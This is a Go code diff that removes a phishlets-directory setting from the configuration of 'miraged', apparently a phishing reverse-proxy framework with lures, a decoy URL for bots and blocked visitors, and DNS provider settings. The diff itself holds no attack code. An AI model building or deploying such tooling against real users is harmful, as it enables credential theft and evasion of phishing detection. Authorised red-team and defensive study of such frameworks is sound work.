@@ -15,10 +15,9 @@ import (
 
 // Default values for optional configuration fields.
 const (
-	DefaultHTTPSPort    = 443
-	DefaultDNSPort      = 53
-	DefaultDataDir      = "/var/lib/mirage"
-	DefaultPhishletsDir = "/etc/mirage/phishlets"
+	DefaultHTTPSPort = 443
+	DefaultDNSPort   = 53
+	DefaultDataDir   = "/var/lib/mirage"
 )
 
 // Config is the top-level configuration for miraged.
@@ -30,7 +29,6 @@ type Config struct {
 	DNSPort      int                 `yaml:"dns_port"`
 	SpoofURL     string              `yaml:"spoof_url"` // default spoof URL served to bots/blocked visitors; can be overridden per-lure
 	DataDir      string              `yaml:"data_dir"`
-	PhishletsDir string              `yaml:"phishlets_dir"`
 	SelfSigned   bool                `yaml:"self_signed"`
 	DNSProviders []DNSProviderConfig `yaml:"dns_providers"`
 	API          APIConfig           `yaml:"api"`
@@ -112,9 +110,6 @@ func (c *Config) applyDefaults() {
 	}
 	if c.DataDir == "" {
 		c.DataDir = DefaultDataDir
-	}
-	if c.PhishletsDir == "" {
-		c.PhishletsDir = DefaultPhishletsDir
 	}
 	if c.Puppet.MinInstances <= 0 {
 		c.Puppet.MinInstances = 1
